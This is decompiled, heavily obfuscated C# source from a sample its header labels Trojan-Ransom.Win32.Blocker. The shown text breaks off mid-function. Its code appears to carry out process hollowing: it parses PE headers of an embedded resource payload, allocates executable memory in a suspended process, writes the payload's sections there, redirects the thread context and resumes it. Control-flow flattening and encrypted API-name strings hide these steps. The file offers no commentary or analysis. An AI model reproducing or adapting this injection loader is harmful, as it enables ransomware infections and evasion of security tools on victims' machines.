// Decompiled with JetBrains decompiler
// Type: Ⴐ.Ⴈ
// Assembly: yzalr14k, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 73F4068F-A403-47FB-B5CB-C14B2659D9D3
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.jvnh-1a7b6e0d12ac2336ab057d2b6e6b7694d384e5bc974736cb0a175e5c77f3e4e4.exe

using \u0006;
using \u0008;
using Microsoft.VisualBasic.CompilerServices;
using SmartAssembly.Attributes;
using System;
using System.Diagnostics;
using System.Resources;
using System.Threading;

namespace Ⴐ
{
  [StandardModule]
  internal sealed class Ⴈ
  {
    private static uint Ⴄ;
    private static uint Ⴍ;

    static Ⴈ()
    {
      Ⴐ.Ⴅ.Ⴓ();
      Ⴈ.Ⴄ = 1069866078U;
      Ⴈ.Ⴍ = 1966638347U;
    }

    public static \u0001 Ⴃ<\u0001>(string Ⴀ)
    {
label_3:
      int num1 = 9;
      \u0001 genericParameter;
      while (true)
      {
        int num2;
        string str;
        int Ⴐ;
        int num3;
        byte num4;
        ulong num5;
        byte num6;
        int num7;
        int num8;
        int num9;
        int num10;
        int num11;
        int num12;
        switch (num1)
        {
          case 0:
            goto label_3;
          case 1:
            num7 = 16;
            goto label_39;
          case 2:
            num8 = 10;
            break;
          case 3:
            num2 = 2;
            num1 = 30;
            continue;
          case 4:
            checked { ++num4; }
            num1 = num4 <= (byte) 102 ? 26 : 31;
            continue;
          case 5:
            num9 = 1;
            goto label_54;
          case 6:
            num10 = 11;
            goto label_49;
          case 7:
            Ⴐ.Ⴅ.Ⴗ(str, Ⴐ, 301, 371);
            num4 = (byte) 8;
            num2 = 6;
            num1 = 30;
            continue;
          case 8:
            num8 = 10;
            break;
          case 9:
            num1 = false ? 2 : 8;
            continue;
          case 10:
            checked { ++num6; }
            num1 = num6 <= (byte) 125 ? 19 : 5;
            continue;
          case 11:
            goto label_58;
          case 12:
            num10 = 14;
            goto label_49;
          case 13:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (Ⴈ.Ⴃ);
            num2 = 3;
            num1 = 30;
            continue;
          case 15:
            checked { ++Ⴐ; }
            num2 = 15;
            num1 = 30;
            continue;
          case 16:
          case 31:
            num11 = 13;
            goto label_34;
          case 17:
            str = Ⴐ.Ⴅ.Ⴜ(1528405423, 1);
            Ⴐ = 0;
            num3 = PoweredByAttribute.ႳႷ.ႳႠ(str, 941, 919);
            num1 = 23;
            continue;
          case 18:
            num12 = 7;
            goto label_43;
          case 19:
            num9 = 5;
            goto label_54;
          case 20:
            checked { ++num5; }
            num1 = num5 <= 72UL ? 6 : 12;
            continue;
          case 21:
          case 22:
            num6 = (byte) 10;
            num2 = 5;
            num1 = 30;
            continue;
          case 23:
            num2 = 15;
            num1 = 30;
            continue;
          case 24:
            num12 = 7;
            goto label_43;
          case 25:
label_44:
            num1 = 30;
            continue;
          case 26:
            num11 = 6;
            goto label_34;
          case 27:
            num1 = Ⴐ < num3 ? 1 : 28;
            continue;
          case 28:
            num7 = 9;
            goto label_39;
          case 29:
            num1 = false ? 24 : 18;
            continue;
          case 30:
            int num13;
            switch (num2)
            {
              case 0:
                num13 = 11;
                break;
              case 1:
                num13 = 32;
                break;
              case 2:
                num13 = 11;
                break;
              case 3:
                num13 = 9;
                break;
              case 4:
                num13 = 13;
                break;
              case 5:
                num13 = 10;
                break;
              case 6:
                num13 = 4;
                break;
              case 7:
                num13 = 33;
                break;
              case 8:
                num13 = 13;
                break;
              case 9:
                num13 = 29;
                break;
              case 10:
                num13 = 17;
                break;
              case 11:
                num13 = 20;
                break;
              case 12:
                num13 = 29;
                break;
              case 13:
                num13 = 15;
                break;
              case 14:
                num13 = 22;
                break;
              case 15:
                num13 = 27;
                break;
              case 16:
                num13 = 7;
                break;
              default:
                num13 = 13;
                break;
            }
            num1 = num13;
            continue;
          case 32:
            Ⴐ.Ⴅ.ႣႨ(284, 368);
            genericParameter = Conversions.ToGenericParameter<\u0001>((object) Ⴓ.Ⴜ(Ⴐ.Ⴅ.Ⴗ(Ⴐ.Ⴅ.Ⴓ(\u0001.Ⴈ(Ⴀ, new char[1]
            {
              Ⴐ.Ⴅ.Ⴜ(58, 140, 157)
            }, 834, 789)[0]), Ⴓ.Ⴃ.Ⴍ(Ⴀ, new char[1]
            {
              Ⴓ.Ⴃ.Ⴓ(58, 697, 722)
            }, 661, 762)[1]), typeof (\u0001), 390, 498));
            num1 = 3;
            continue;
          case 33:
            num5 = 3UL;
            num2 = 11;
            num1 = 30;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle2 = __methodref (Ⴈ.Ⴃ);
            num1 = 0;
            continue;
        }
        num2 = num8;
        num1 = 30;
        continue;
label_34:
        num2 = num11;
        num1 = 30;
        continue;
label_39:
        num2 = num7;
        num1 = 30;
        continue;
label_43:
        num2 = num12;
        goto label_44;
label_49:
        num2 = num10;
        num1 = 30;
        continue;
label_54:
        num2 = num9;
        num1 = 30;
      }
label_58:
      return genericParameter;
    }

    public static void Ⴃ(byte[] Ⴗ, ushort Ⴈ, ulong Ⴍ, ushort Ⴀ, short Ⴜ)
    {
      int num1 = 66;
      Thread Ⴀ1;
      string Ⴅ1;
      string Ⴗ1;
      byte[] numArray1;
      int num2;
      int num3;
      bool flag1;
      IntPtr Ⴓ1;
      IntPtr[] ႷႼ;
      while (true)
      {
        int num4;
        int num5;
        string str1;
        int Ⴐ1;
        int num6;
        byte num7;
        int num8;
        string ႷႷ;
        string str2;
        int Ⴐ2;
        int num9;
        string[] strArray;
        int index;
        string Ⴃ;
        byte[] numArray2;
        int[] numArray3;
        Decimal limit;
        Decimal num10;
        long num11;
        int num12;
        int num13;
        int num14;
        int num15;
        int num16;
        int num17;
        int num18;
        int num19;
        int num20;
        int num21;
        int num22;
        int num23;
        int num24;
        int num25;
        switch (num1)
        {
          case 0:
            num12 = 40;
            goto label_107;
          case 1:
            string Ⴗ2 = PoweredByAttribute.ႳႷ.ႳႨ(Ⴐ.Ⴅ.Ⴗ(PoweredByAttribute.ႳႷ.ႳႳ(354, 376), 0, 405, 459), 350, 377);
            Ⴅ1 = Ⴐ.Ⴅ.Ⴜ(1528405429, 8);
            Ⴗ1 = Ⴐ.Ⴅ.Ⴜ(1528405429, 2);
            string Ⴅ2 = Ⴐ.Ⴅ.Ⴗ(true, Ⴅ1, Ⴗ1);
            num1 = !PoweredByAttribute.ႳႷ.ႳႥ(PoweredByAttribute.ႳႷ.ႨႣ(Ⴗ2, Ⴅ2, 846, 774), 866, 793) ? 53 : 45;
            continue;
          case 2:
            str1 = Ⴐ.Ⴅ.Ⴜ(1528405410, 6);
            Ⴐ1 = 0;
            num6 = PoweredByAttribute.ႳႷ.ႳႠ(str1, 564, 526);
            num1 = 33;
            continue;
          case 3:
            numArray3[1] = 16;
            numArray3[2] = 2;
            numArray3[3] = 32;
            num1 = 71;
            continue;
          case 4:
            num13 = 34;
            goto label_115;
          case 5:
            num14 = 23;
            goto label_100;
          case 6:
            num15 = 28;
            goto label_148;
          case 7:
            flag1 = true;
            Ⴅ1 = Ⴐ.Ⴅ.Ⴜ(1528405258, 7);
            Ⴗ1 = Ⴐ.Ⴅ.Ⴜ(1528405251, 3);
            num1 = 75;
            continue;
          case 8:
            num13 = 9;
            goto label_115;
          case 9:
            num11 = 7L;
            num4 = 44;
            num1 = 11;
            continue;
          case 10:
            Ⴀ1 = new Thread(new ParameterizedThreadStart(Ⴐ.Ⴅ.Ⴜ));
            Ⴐ.Ⴅ.Ⴓ(Ⴀ1, ApartmentState.STA, 651, 756);
            num1 = 39;
            continue;
          case 11:
            int num26;
            switch (num4)
            {
              case 0:
                num26 = 2;
                break;
              case 1:
                num26 = 10;
                break;
              case 2:
                num26 = 79;
                break;
              case 3:
                num26 = 7;
                break;
              case 4:
                num26 = 81;
                break;
              case 5:
                num26 = 19;
                break;
              case 6:
                num26 = 57;
                break;
              case 7:
                num26 = 85;
                break;
              case 8:
                num26 = 17;
                break;
              case 9:
                num26 = 36;
                break;
              case 10:
                num26 = 28;
                break;
              case 11:
                num26 = 2;
                break;
              case 12:
                num26 = 74;
                break;
              case 13:
                goto label_155;
              case 14:
                num26 = 70;
                break;
              case 15:
                num26 = 61;
                break;
              case 16:
                num26 = 68;
                break;
              case 17:
                num26 = 56;
                break;
              case 18:
                num26 = 25;
                break;
              case 19:
                num26 = 78;
                break;
              case 20:
                num26 = 23;
                break;
              case 21:
                num26 = 47;
                break;
              case 22:
                num26 = 3;
                break;
              case 23:
                num26 = 26;
                break;
              case 24:
                num26 = 42;
                break;
              case 25:
                num26 = 90;
                break;
              case 26:
                num26 = 38;
                break;
              case 27:
                num26 = 88;
                break;
              case 28:
                num26 = 9;
                break;
              case 29:
                num26 = 60;
                break;
              case 30:
                num26 = 49;
                break;
              case 31:
                num26 = 34;
                break;
              case 32:
                num26 = 83;
                break;
              case 33:
                num26 = 89;
                break;
              case 34:
                num26 = 32;
                break;
              case 35:
                num26 = 24;
                break;
              case 36:
                num26 = 84;
                break;
              case 37:
                num26 = 86;
                break;
              case 38:
                num26 = 30;
                break;
              case 39:
                num26 = 35;
                break;
              case 40:
                num26 = 87;
                break;
              case 41:
                num26 = 79;
                break;
              case 42:
                num26 = 58;
                break;
              case 43:
                num26 = 1;
                break;
              case 44:
                num26 = 43;
                break;
              case 45:
                num26 = 64;
                break;
              case 46:
                num26 = 52;
                break;
              case 47:
                num26 = 91;
                break;
              default:
                num26 = 38;
                break;
            }
            num1 = num26;
            continue;
          case 12:
            num16 = 29;
            goto label_76;
          case 13:
          case 82:
            num4 = 33;
            num1 = 11;
            continue;
          case 14:
            num17 = 20;
            goto label_143;
          case 15:
            num4 = 46;
            num1 = 11;
            continue;
          case 16:
            num4 = 45;
            num1 = 11;
            continue;
          case 17:
            num8 = (int) num7;
            num4 = 24;
            num1 = 11;
            continue;
          case 18:
          case 38:
            num5 = 0;
            num4 = 16;
            num1 = 11;
            continue;
          case 19:
            numArray3[7] = 64;
            num1 = 56;
            continue;
          case 20:
            num18 = 8;
            goto label_86;
          case 21:
            num12 = 35;
            goto label_107;
          case 22:
            num19 = 32;
            break;
          case 23:
            num1 = false ? 44 : 6;
            continue;
          case 24:
            string Ⴗ3 = Ⴃ;
            Ⴅ1 = Ⴐ.Ⴅ.Ⴜ(1528405281, 4);
            Ⴗ1 = Ⴐ.Ⴅ.Ⴜ(1528405302, 8);
            string Ⴅ3 = Ⴐ.Ⴅ.Ⴗ(false, Ⴅ1, Ⴗ1);
            ႷႷ = PoweredByAttribute.ႳႷ.ႨႣ(Ⴗ3, Ⴅ3, 416, 488);
            num1 = 48;
            continue;
          case 25:
            IntPtr num27;
            num1 = Ⴈ.Ⴃ<Ⴈ.ႰႣ>(Ⴐ.Ⴅ.Ⴗ(false, Ⴅ1, Ⴗ1))((string) null, ႷႷ, num27, num27, false, 4, num27, (string) null, new byte[0], ႷႼ) ? 14 : 50;
            continue;
          case 26:
            string Ⴗ4 = PoweredByAttribute.ႳႷ.ႳႨ(Ⴐ.Ⴅ.Ⴗ(PoweredByAttribute.ႳႷ.ႳႳ(415, 389), 0, 254, 160), 525, 554);
            Ⴅ1 = Ⴐ.Ⴅ.Ⴜ(1528405485, 3);
            Ⴗ1 = Ⴐ.Ⴅ.Ⴜ(1528405474, 6);
            string Ⴅ4 = Ⴐ.Ⴅ.Ⴗ(true, Ⴅ1, Ⴗ1);
            strArray = \u0001.Ⴈ(PoweredByAttribute.ႳႷ.ႨႣ(Ⴗ4, Ⴅ4, 101, 45), 69, 30);
            num1 = 15;
            continue;
          case 27:
            num19 = 16;
            break;
          case 28:
            num1 = num8 != 25 ? 12 : 46;
            continue;
          case 29:
            num4 = 5;
            num1 = 11;
            continue;
          case 30:
            Ⴓ1 = new IntPtr(Ⴐ.Ⴅ.Ⴓ(checked (num2 + 84), Ⴗ));
            ႷႼ = new IntPtr[4];
            num1 = 67;
            continue;
          case 31:
            num20 = 1;
            goto label_68;
          case 32:
            numArray2 = new byte[6]
            {
              (byte) 0,
              (byte) 1,
              (byte) 0,
              (byte) 0,
              (byte) 0,
              (byte) 0
            };
            num1 = 16;
            continue;
          case 33:
            num4 = 33;
            num1 = 11;
            continue;
          case 34:
            goto label_237;
          case 35:
            Ⴐ.Ⴅ.Ⴗ(str1, Ⴐ1, 887, 809);
            checked { ++Ⴐ1; }
            num1 = 82;
            continue;
          case 36:
            Ⴃ = strArray[index];
            string Ⴐ3 = \u0001.ႣႤ(Ⴃ, 600, 593);
            Ⴅ1 = Ⴐ.Ⴅ.Ⴜ(1528405456, 7);
            Ⴗ1 = Ⴐ.Ⴅ.Ⴜ(1528405290, 4);
            string Ⴍ1 = Ⴐ.Ⴅ.Ⴗ(false, Ⴅ1, Ⴗ1);
            num1 = !\u0001.ႣႨ(Ⴐ3, Ⴍ1, 269, 289) ? 0 : 21;
            continue;
          case 37:
            num14 = 41;
            goto label_100;
          case 39:
            num4 = 27;
            num1 = 11;
            continue;
          case 40:
            num21 = 4;
            goto label_133;
          case 41:
            num22 = 10;
            goto label_82;
          case 42:
            num1 = num8 <= 30 ? 41 : 80;
            continue;
          case 43:
            checked { ++num11; }
            num1 = num11 <= 30L ? 59 : 77;
            continue;
          case 44:
            num15 = 13;
            goto label_148;
          case 45:
            num23 = 6;
            goto label_92;
          case 46:
            num16 = 7;
            goto label_76;
          case 47:
          case 76:
            goto label_88;
          case 48:
            num4 = 47;
            num1 = 11;
            continue;
          case 49:
            num1 = ObjectFlowControl.ForLoopControl.ForNextCheckDec(num10, limit, 1M) ? 54 : 40;
            continue;
          case 50:
            num17 = 31;
            goto label_143;
          case 51:
            num18 = 21;
            goto label_86;
          case 52:
            index = 0;
            num4 = 12;
            num1 = 11;
            continue;
          case 53:
            num23 = 34;
            goto label_92;
          case 54:
            num21 = 14;
            goto label_133;
          case 55:
            num4 = 19;
            num1 = 11;
            continue;
          case 56:
            num2 = Ⴐ.Ⴅ.Ⴓ(60, Ⴗ);
            num4 = 15;
            num1 = 11;
            continue;
          case 57:
            str2 = Ⴐ.Ⴅ.Ⴜ(1528405398, 0);
            Ⴐ2 = 0;
            num9 = PoweredByAttribute.ႳႷ.ႳႠ(str2, 14, 52);
            num1 = 69;
            continue;
          case 58:
            checked { ++num7; }
            num1 = num7 <= (byte) 20 ? 20 : 51;
            continue;
          case 59:
            num24 = 44;
            goto label_153;
          case 60:
            checked { ++num8; }
            num4 = 24;
            num1 = 11;
            continue;
          case 61:
            limit = 40M;
            num10 = 13M;
            num4 = 30;
            num1 = 11;
            continue;
          case 62:
            num20 = 39;
            goto label_68;
          case 63:
            num4 = 37;
            num1 = 11;
            continue;
          case 64:
            numArray2[2] = (byte) 2;
            numArray2[3] = (byte) 3;
            numArray2[4] = (byte) 4;
            num1 = 63;
            continue;
          case 65:
            num25 = 36;
            goto label_60;
          case 67:
            num4 = 3;
            num1 = 11;
            continue;
          case 68:
            checked { ++num5; }
            num1 = num5 <= 100 ? 27 : 22;
            continue;
          case 69:
            num4 = 19;
            num1 = 11;
            continue;
          case 70:
            num10 = \u0001.Ⴀ(num10, 1M, 325, 381);
            num4 = 30;
            num1 = 11;
            continue;
          case 71:
            num4 = 25;
            num1 = 11;
            continue;
          case 72:
            num4 = 38;
            num1 = 11;
            continue;
          case 73:
            num4 = 22;
            num1 = 11;
            continue;
          case 74:
            num1 = index < strArray.Length ? 8 : 4;
            continue;
          case 75:
            num4 = 18;
            num1 = 11;
            continue;
          case 77:
            num24 = 13;
            goto label_153;
          case 78:
            num1 = Ⴐ2 < num9 ? 37 : 5;
            continue;
          case 79:
            Ⴐ.Ⴅ.Ⴗ(str2, Ⴐ2, 727, 649);
            checked { ++Ⴐ2; }
            num1 = 55;
            continue;
          case 80:
            num22 = 42;
            goto label_82;
          case 81:
            num3 = (int) PoweredByAttribute.Ⴜ(Ⴗ, checked (num2 + 6), 423, 388);
            flag1 = false;
            num1 = 72;
            continue;
          case 83:
            num1 = Ⴗ[60] != (byte) 128 ? 65 : 92;
            continue;
          case 84:
            ႷႷ = PoweredByAttribute.Ⴀ(PoweredByAttribute.ႳႷ.ႳႰ(326, 270), 131, 135);
            num4 = 43;
            num1 = 11;
            continue;
          case 85:
            num4 = 42;
            num1 = 11;
            continue;
          case 86:
            numArray2[5] = (byte) 5;
            numArray1 = numArray2;
            numArray3 = new int[8];
            numArray3[0] = 1;
            num1 = 73;
            continue;
          case 87:
            checked { ++index; }
            num4 = 12;
            num1 = 11;
            continue;
          case 88:
            num7 = (byte) 0;
            num4 = 8;
            num1 = 11;
            continue;
          case 89:
            num1 = Ⴐ1 < num6 ? 62 : 31;
            continue;
          case 90:
            numArray3[4] = 4;
            numArray3[5] = 64;
            numArray3[6] = 4;
            num1 = 29;
            continue;
          case 91:
            num4 = 34;
            num1 = 11;
            continue;
          case 92:
            num25 = 11;
            goto label_60;
          default:
            num4 = 26;
            num1 = 11;
            continue;
        }
        num4 = num19;
        num1 = 11;
        continue;
label_60:
        num4 = num25;
        num1 = 11;
        continue;
label_68:
        num4 = num20;
        num1 = 11;
        continue;
label_76:
        num4 = num16;
        num1 = 11;
        continue;
label_82:
        num4 = num22;
        num1 = 11;
        continue;
label_86:
        num4 = num18;
        num1 = 11;
        continue;
label_92:
        num4 = num23;
        num1 = 11;
        continue;
label_100:
        num4 = num14;
        num1 = 11;
        continue;
label_107:
        num4 = num12;
        num1 = 11;
        continue;
label_115:
        num4 = num13;
        num1 = 11;
        continue;
label_133:
        num4 = num21;
        num1 = 11;
        continue;
label_143:
        num4 = num17;
        num1 = 11;
        continue;
label_148:
        num4 = num15;
        num1 = 11;
        continue;
label_153:
        num4 = num24;
        num1 = 11;
      }
label_237:
      return;
label_88:
      \u0001.Ⴗ(Ⴀ1, (object) Ⴗ, 325, 360);
      goto label_257;
label_155:
      try
      {
        int num28 = 0;
        while (true)
        {
          int num29;
          uint[] Ⴈ1;
          IntPtr Ⴃ;
          IntPtr Ⴜ1;
          IntPtr num30;
          IntPtr num31;
          IntPtr Ⴍ2;
          Ⴈ.ႳႳ ⴓⴓ1;
          bool flag2;
          int[] Ⴅ5;
          int num32;
          int num33;
          byte[] Ⴅ6;
          int num34;
          int num35;
          int num36;
          int num37;
          switch (num28)
          {
            case 1:
              Ⴅ6 = new byte[checked (Ⴅ5[4] - 1 + 1)];
              num29 = 13;
              num28 = 8;
              continue;
            case 2:
              Ⴅ5.Length.ToString();
              Ⴈ.ႳႳ ⴓⴓ2 = ⴓⴓ1;
              IntPtr Ⴈ2 = ႷႼ[0];
              num31 = new IntPtr(checked (PoweredByAttribute.ႤႷ(ref Ⴍ2, 539, 590) + Ⴅ5[3]));
              IntPtr Ⴗ5 = num31;
              byte[] Ⴐ4 = Ⴅ6;
              num30 = new IntPtr(Ⴅ6.Length);
              IntPtr Ⴓ2 = num30;
              ref IntPtr local1 = ref Ⴜ1;
              flag2 = ⴓⴓ2(Ⴈ2, Ⴗ5, Ⴐ4, Ⴓ2, ref local1);
              num28 = 51;
              continue;
            case 3:
              num34 = 4;
              break;
            case 5:
              Ⴅ1 = Ⴐ.Ⴅ.Ⴜ(1528405237, 5);
              Ⴗ1 = Ⴐ.Ⴅ.Ⴜ(1528405185, 8);
              Ⴈ.ႳႰ ⴓⴐ = Ⴈ.Ⴃ<Ⴈ.ႳႰ>(Ⴐ.Ⴅ.Ⴗ(false, Ⴅ1, Ⴗ1));
              IntPtr Ⴈ3 = ႷႼ[0];
              num30 = new IntPtr(Ⴐ.Ⴅ.Ⴓ(checked (num2 + 52), Ⴗ));
              IntPtr Ⴀ2 = num30;
              num31 = new IntPtr(Ⴐ.Ⴅ.Ⴓ(checked (num2 + 80), Ⴗ));
              IntPtr Ⴐ5 = num31;
              Ⴍ2 = ⴓⴐ(Ⴈ3, Ⴀ2, Ⴐ5, 12288, 64);
              num28 = 33;
              continue;
            case 6:
              Ⴅ1 = Ⴐ.Ⴅ.Ⴜ(1528405126, 6);
              Ⴗ1 = Ⴐ.Ⴅ.Ⴜ(1528405147, 2);
              num28 = Ⴈ.Ⴃ<Ⴈ.ႳႤ>(Ⴐ.Ⴅ.Ⴗ(true, Ⴅ1, Ⴗ1))(ႷႼ[0], Ⴃ) != 0U ? 48 : 27;
              continue;
            case 7:
              num29 = 21;
              num28 = 8;
              continue;
            case 8:
              int num38;
              switch (num29)
              {
                case 0:
                  num38 = 10;
                  break;
                case 1:
                  num38 = 2;
                  break;
                case 2:
                  num38 = 25;
                  break;
                case 3:
                  num38 = 1;
                  break;
                case 4:
                  num38 = 16;
                  break;
                case 5:
                  num38 = 14;
                  break;
                case 6:
                  num38 = 9;
                  break;
                case 7:
                  num38 = 42;
                  break;
                case 8:
                  num38 = 24;
                  break;
                case 9:
                  num38 = 39;
                  break;
                case 10:
                  num38 = 31;
                  break;
                case 11:
                  num38 = 45;
                  break;
                case 12:
                  num38 = 1;
                  break;
                case 13:
                  num38 = 23;
                  break;
                case 14:
                  num38 = 32;
                  break;
                case 15:
                  num38 = 6;
                  break;
                case 16:
                  num38 = 18;
                  break;
                case 17:
                  num38 = 29;
                  break;
                case 18:
                  num38 = 37;
                  break;
                case 19:
                  num38 = 43;
                  break;
                case 20:
                  num38 = 39;
                  break;
                case 21:
                  num38 = 46;
                  break;
                case 22:
                  num38 = 25;
                  break;
                case 23:
                  num38 = 50;
                  break;
                case 24:
                  num38 = 5;
                  break;
                case 25:
                  num38 = 44;
                  break;
                case 26:
                  num38 = 30;
                  break;
                case 27:
                  num38 = 12;
                  break;
                default:
                  num38 = 39;
                  break;
              }
              num28 = num38;
              continue;
            case 9:
              num28 = num33 <= num32 ? 38 : 26;
              continue;
            case 10:
              num29 = 5;
              num28 = 8;
              continue;
            case 11:
              num29 = 2;
              num28 = 8;
              continue;
            case 12:
              Ⴗ1 = Ⴐ.Ⴅ.Ⴜ(1528405365, 3);
              num28 = !Ⴈ.Ⴃ<Ⴈ.ႰႠ>(Ⴐ.Ⴅ.Ⴗ(true, Ⴅ1, Ⴗ1))(ႷႼ[1], Ⴈ1) ? 41 : 3;
              continue;
            case 13:
              num28 = 8;
              continue;
            case 14:
              num29 = 14;
              num28 = 8;
              continue;
            case 15:
              num29 = 8;
              num28 = 8;
              continue;
            case 16:
              flag1 = false;
              Ⴅ1 = Ⴐ.Ⴅ.Ⴜ(1528405337, 8);
              Ⴗ1 = Ⴐ.Ⴅ.Ⴜ(1528405164, 5);
              num28 = 28;
              continue;
            case 17:
              num35 = 5;
              goto label_200;
            case 18:
              numArray1 = (byte[]) null;
              flag2 = ⴓⴓ1(ႷႼ[0], Ⴍ2, Ⴗ, Ⴓ1, ref Ⴜ1);
              num28 = 7;
              continue;
            case 19:
              num29 = 10;
              num28 = 8;
              continue;
            case 20:
              num29 = 17;
              num28 = 8;
              continue;
            case 21:
              num35 = 15;
              goto label_200;
            case 22:
              num29 = 18;
              num28 = 8;
              continue;
            case 23:
              \u0001.Ⴗ((Array) Ⴗ, Ⴅ5[5], (Array) Ⴅ6, 0, Ⴅ6.Length, 308, 294);
              goto case 45;
            case 24:
              Ⴈ1[44] = checked ((uint) (Ⴓ.Ⴄ(ref Ⴍ2, 107, 8) + Ⴐ.Ⴅ.Ⴓ(num2 + 40, Ⴗ)));
              num28 = 19;
              continue;
            case 25:
              goto label_145;
            case 26:
              num36 = 25;
              goto label_227;
            case 27:
              num37 = 24;
              goto label_204;
            case 28:
              num29 = 7;
              goto case 13;
            case 29:
              \u0001.Ⴗ((Array) Ⴗ, checked (num2 + 248 + num33 * 40), (Array) Ⴅ5, 0, 40, 491, 505);
              num28 = 34;
              continue;
            case 30:
              checked { ++num33; }
              goto case 36;
            case 31:
              Ⴅ1 = Ⴐ.Ⴅ.Ⴜ(1528405012, 2);
              Ⴗ1 = Ⴐ.Ⴅ.Ⴜ(1528405103, 4);
              int num39 = Ⴈ.Ⴃ<Ⴈ.ႰႠ>(Ⴐ.Ⴅ.Ⴗ(false, Ⴅ1, Ⴗ1))(ႷႼ[1], Ⴈ1) ? 1 : 0;
              num28 = 22;
              continue;
            case 32:
            case 49:
              goto label_242;
            case 33:
              num29 = 19;
              num28 = 8;
              continue;
            case 34:
              num29 = 3;
              num28 = 8;
              continue;
            case 35:
              num29 = 16;
              num28 = 8;
              continue;
            case 36:
              num29 = 6;
              num28 = 8;
              continue;
            case 37:
              int num40 = Ⴈ.Ⴃ<Ⴈ.ႳႥ>(Ⴐ.Ⴅ.Ⴗ(false, (string) null, Ⴐ.Ⴅ.Ⴜ(1528405062, 4)))(ႷႼ[1]);
              num28 = 11;
              continue;
            case 38:
              num36 = 23;
              goto label_227;
            case 39:
              Ⴈ1 = new uint[179];
              Ⴈ1[0] = 65538U;
              Ⴅ1 = Ⴐ.Ⴅ.Ⴜ(1528405372, 3);
              num28 = 47;
              continue;
            case 40:
              num29 = 6;
              num28 = 8;
              continue;
            case 41:
              num34 = 14;
              break;
            case 42:
              num28 = !Ⴈ.Ⴃ<Ⴈ.ႰႼ>(Ⴐ.Ⴅ.Ⴗ(true, Ⴅ1, Ⴗ1))(ႷႼ[0], new IntPtr(checked ((long) Ⴈ1[41] + 8L)), ref Ⴃ, new IntPtr(4), ref Ⴜ1) ? 17 : 21;
              continue;
            case 43:
              Ⴅ1 = Ⴐ.Ⴅ.Ⴜ(1528405030, 2);
              Ⴗ1 = Ⴐ.Ⴅ.Ⴜ(1528405054, 1);
              ⴓⴓ1 = Ⴈ.Ⴃ<Ⴈ.ႳႳ>(Ⴐ.Ⴅ.Ⴗ(false, Ⴅ1, Ⴗ1));
              num28 = 35;
              continue;
            case 44:
              flag1 = false;
              Ⴈ.ႳႳ ⴓⴓ3 = ⴓⴓ1;
              IntPtr Ⴈ4 = ႷႼ[0];
              num31 = new IntPtr(checked ((long) Ⴈ1[41] + 8L));
              IntPtr Ⴗ6 = num31;
              byte[] Ⴐ6 = Ⴐ.Ⴅ.Ⴗ(Ⴓ.Ⴄ(ref Ⴍ2, 61, 94));
              num30 = new IntPtr(4);
              IntPtr Ⴓ3 = num30;
              ref IntPtr local2 = ref Ⴜ1;
              flag2 = ⴓⴓ3(Ⴈ4, Ⴗ6, Ⴐ6, Ⴓ3, ref local2);
              num28 = 15;
              continue;
            case 45:
              num29 = 1;
              num28 = 8;
              continue;
            case 46:
              Ⴅ5 = new int[10];
              flag1 = true;
              num32 = checked (num3 - 1);
              num33 = 0;
              num28 = 40;
              continue;
            case 47:
              num29 = 27;
              num28 = 8;
              continue;
            case 48:
              num37 = 0;
              goto label_204;
            case 50:
              Ⴅ5[0] = 13;
              Ⴅ5[5] = checked ((int) byte.MaxValue + Ⴅ5[0]);
              num28 = 20;
              continue;
            case 51:
              num29 = 26;
              num28 = 8;
              continue;
            default:
              num29 = 20;
              num28 = 8;
              continue;
          }
          num29 = num34;
          num28 = 8;
          continue;
label_200:
          num29 = num35;
          num28 = 8;
          continue;
label_204:
          num29 = num37;
          num28 = 8;
          continue;
label_227:
          num29 = num36;
          num28 = 8;
        }
label_145:
        return;
      }
      catch (Exception ex)
      {
        Ⴓ.Ⴓ(ex, 931, 987);
        Ⴓ.ႥႥ(442, 402);
      }
label_242:
      int num41 = 3;
label_243:
      int num42;
      while (true)
      {
        switch (num41)
        {
          case 0:
            goto label_240;
          case 1:
            num42 = 4;
            num41 = 7;
            continue;
          case 2:
            goto label_257;
          case 4:
          case 7:
            int num43;
            switch (num42)
            {
              case 0:
                num43 = 0;
                break;
              case 1:
                num43 = 6;
                break;
              case 2:
                num43 = 2;
                break;
              case 3:
                num43 = 6;
                break;
              case 4:
                num43 = 2;
                break;
              case 5:
                num43 = 2;
                break;
              case 6:
                num43 = 6;
                break;
              default:
                num43 = 6;
                break;
            }
            num41 = num43;
            continue;
          case 6:
            Process.GetProcessById(Ⴓ.Ⴄ(ref ႷႼ[2], 772, 871)).Kill();
            goto case 1;
          default:
            num42 = 3;
            num41 = 7;
            continue;
        }
      }
label_240:
      return;
label_257:
      num42 = 0;
      num41 = 7;
      goto label_243;
    }

    [STAThread]
    public static void Ⴅ()
    {
      Ⴐ.Ⴅ.Ⴓ();
label_1:
      int num1;
      int num2;
      try
      {
        int num3 = 57;
label_2:
        int num4;
        while (true)
        {
          int num5;
          int num6;
          long num7;
          bool flag;
          Decimal limit;
          Decimal num8;
          ResourceManager Ⴗ;
          int num9;
          int num10;
          int num11;
          int num12;
          int num13;
          int num14;
          int num15;
          int num16;
          int num17;
          switch (num3)
          {
            case 0:
              num4 = 14;
              Ⴈ.Ⴃ(Ⴐ.Ⴅ.Ⴓ((ushort) 6117, 0.0, (byte[]) PoweredByAttribute.ႳႷ.ႨႨ(Ⴗ, Ⴐ.Ⴅ.Ⴗ(false, Ⴐ.Ⴅ.Ⴜ(1528405936, 8), Ⴐ.Ⴅ.Ⴜ(1528405898, 4)), 186, 237)), (ushort) 8040, 1822891455UL, (ushort) 25904, (short) 4305);
              num3 = 23;
              continue;
            case 1:
              num9 = 8;
              goto label_53;
            case 2:
              num10 = 1;
              goto label_57;
            case 3:
              num11 = 7;
              goto label_85;
            case 4:
            case 17:
            case 19:
              goto label_119;
            case 5:
              num11 = 1;
              goto label_85;
            case 6:
              num11 = 25;
              goto label_85;
            case 7:
              goto label_133;
            case 8:
              num11 = 14;
              goto label_85;
            case 10:
              num3 = ObjectFlowControl.ForLoopControl.ForNextCheckDec(num8, limit, 1M) ? 29 : 1;
              continue;
            case 11:
              Ⴗ = new ResourceManager(Ⴐ.Ⴅ.Ⴜ(1528405920, 5), PoweredByAttribute.ႳႷ.ႳႰ(869, 812));
              num5 = 9;
              num3 = 30;
              continue;
            case 12:
              num12 = 1;
